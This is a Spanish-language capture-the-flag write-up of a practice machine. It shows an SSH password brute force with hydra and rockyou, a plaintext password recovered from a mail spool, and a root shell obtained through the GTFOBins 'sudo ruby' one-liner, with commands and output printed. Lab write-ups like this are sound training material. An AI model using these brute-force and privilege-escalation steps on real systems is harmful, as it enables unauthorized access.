# Herramientas
- Nmap
- Hydra
- GTFOBins
# Procedimiento
Hacemos nuestro escaneo con nmap y podemos ver que están los puerto 22 y 80, revisamos la página y al principio puede parecer que no hay nada, pero...
![[Pasted image 20250715094025.png]]
Si inspeccionamos la página, nos encontramos con esto:
![[Pasted image 20250715094057.png]]

De: Juan
Para: Camilo , te he dejado un correo es importante...

Podemos ver dos posibles usuarios, por lo que empezamos a realizar fuerza bruta con hydra.

Vemos que con juan no resulta nada:
```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2    
  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organization  
s, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-15 09:42:07  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found  
, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task  
[DATA] attacking ssh://172.17.0.2:22/  
[STATUS] 31014.00 tries/min, 31014 tries in 00:01h, 14313385 to do in 07:42h, 16 active  
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Pero con camilo sí:
```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organization  
s, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-15 09:42:33  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found  
, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task  
[DATA] attacking ssh://172.17.0.2:22/  
[22][ssh] host: 172.17.0.2   login: camilo   password: password1  
1 of 1 target successfully completed, 1 valid password found  
[WARNING] Writing restore file because 2 final worker threads did not complete until end.  
[ERROR] 2 targets did not resolve or could not be connected  
[ERROR] 0 target did not complete  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-15 09:42:44
```

Entramos a la máquina, pero nos da error por un tema de que ya estaba guardado el host anteriormente, por lo que seguimos el siguiente comando:
```
ssh camilo@172.17.0.2  
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @  
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!  
Someone could be eavesdropping on you right now (man-in-the-middle attack)!  
It is also possible that a host key has just been changed.  
The fingerprint for the ED25519 key sent by the remote host is  
SHA256:52z4CT20OpL7G8YfPhcdERem6Sq+z8868LngvNGXRlA.  
Please contact your system administrator.  
Add correct host key in /home/mapacheroja/.ssh/known_hosts to get rid of this message.  
Offending ECDSA key in /home/mapacheroja/.ssh/known_hosts:10  
 remove with:  
 ssh-keygen -f '/home/mapacheroja/.ssh/known_hosts' -R '172.17.0.2'  
Host key for 172.17.0.2 has changed and you have requested strict checking.  
Host key verification failed.  

ssh-keygen -f '/home/mapacheroja/.ssh/known_hosts' -R '172.17.0.2'  
```

Procedemos a buscar permisos SUID:
- /: Se busca desde la raíz
- -perm -4000: Mostrar los permisos SUID
- 2>/dev/null: Para no mostrar los errores
```
find / -perm -4000 2>/dev/null
```

No encontramos nada útil:
```
find / -perm -4000 2>/dev/null  
/bin/su  
/bin/mount  
/bin/umount  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/bin/chsh  
/usr/bin/chfn  
/usr/bin/passwd  
/usr/bin/newgrp  
/usr/bin/gpasswd  
/usr/bin/sudo
```

Por lo que procedemos a utilizar el comando `find / -name "correo" 2>/dev/null` para encontrar el correo.

No encontramos nada, así que buscamos con "mail" y vemos lo siguiente:
```
find / -name "mail" 2>/dev/null  
/var/spool/mail  
/var/mail
```

Nos vamos a esa carpeta e imprimimos el mensaje que hay:
```
cd /var/spool/mail/camilo/
cat correo.txt
Hola Camilo,  
  
Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña  
: 2k84dicb
```

Salimos de la consola y volvemos a entrar, esta vez con el usuario de juan y colocamos la contraseña dada. Una vez dentro listamos los permisos que tiene juan
```
sudo -l  
Matching Defaults entries for juan on 89d6c54e265d:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User juan may run the following commands on 89d6c54e265d:  
   (ALL) NOPASSWD: /usr/bin/ruby
```

Como podemos ver, está ruby. Para ello tenemos que ir a GTFOBins y buscar ruby. Está en este [link](https://gtfobins.github.io/gtfobins/ruby/), y usamos el que dice `sudo`.
```
sudo ruby -e 'exec "/bin/sh"'
# whoami
root
```

Con esto ya podemos decir que la máquina fue hackeada y hemos escalado privilegios :)